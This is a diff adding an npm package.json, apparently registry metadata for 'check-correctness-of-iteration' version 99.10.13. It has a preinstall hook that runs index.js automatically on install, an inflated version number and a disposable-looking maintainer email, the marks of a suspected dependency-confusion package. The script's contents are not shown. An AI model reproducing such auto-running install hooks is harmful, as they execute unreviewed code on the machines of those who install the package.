@@ -1,0 +1,39 @@
+{
+    "name": "check-correctness-of-iteration",
+    "version": "99.10.13",
+    "description": "rukkaz package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "check-correctness-of-iteration@99.10.13",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-gSxEDeKynaKJgQBcL9GoE0sq9C3vQqMnV6o6V7UEz3B1jpQWFkOY4NVi67zgwEcjfutlyTI381JJWHs7+Cr/Dg==",
+        "shasum": "e7910073d1b9412f7a4127d39ff6291284cb6197",
+        "tarball": "https://registry.npmjs.org/check-correctness-of-iteration/-/check-correctness-of-iteration-99.10.13.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5088,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQOXYACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmpDwA/+PNspIMNJwVsf0geiBBBbtw9mcijq5FR67BOq5GNXXO4KHVBN\r\n+JNVP70QrazWU8PwlgWMBWQHZbQvJ+VwrJCbVmg0ZMhHmHXX577ZUQcAs4lJ\r\naD+0A9OD165PeJKzox2QBnf5Jmh69l6ngExlwrbUqFpuZfvYC6WEuKDIc0D+\r\njw/NgDZa1TlefFJCKNhUVGx6GlazJc/uaIUDscJopAKWMRdE+Jdrnxh98Rns\r\nM3v+KhB/kmeuqFzsq9fAyPQWUBGqv5UatJ8fJS8ygG8WmZmytK1G17sqefVj\r\nrhpG5rVHi/XW6QZMWtA6d0L6rJHsaefrVL6wf4R8wEF0R5O/Ka9vagXsVB7W\r\nvyVa+LobVkAY1YCgWslhSgGaWNai5zMkOqRxYT83696qnLq1Iv1FRmJE7yS8\r\n2AxcpUXpGmi79LvkVdVse7FNDXxOcBurehWi6R7aOHPTi+Rt8UQNIeU1ogN0\r\n04EAAyNz59jfDS5wPfNwn83qd4QjNSM1hz7nQPgdQl8r97yfZWCTEpEoLpyJ\r\nrjePMVgkbKcebIKtVvdp2vadaX33cs5oWsgI9vMvTZvcLeDjQHGMHjzhRa7X\r\nHeFiE2EsaBKgJKFeFstm8A2CBgvfa58OXpH0OWFUyhJ3VOWM3hPdhFO8ko9B\r\n/YnEmhOv7WbaTSTfcchJIMTUaEpvHVgI7jE=\r\n=UZD3\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "efarppip",
+        "email": "efarppip@33mail.ga"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "efarppip",
+            "email": "efarppip@33mail.ga"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/check-correctness-of-iteration_99.10.13_1648420311945_0.09135961449189467"
+    },
+    "_hasShrinkwrap": false
+}
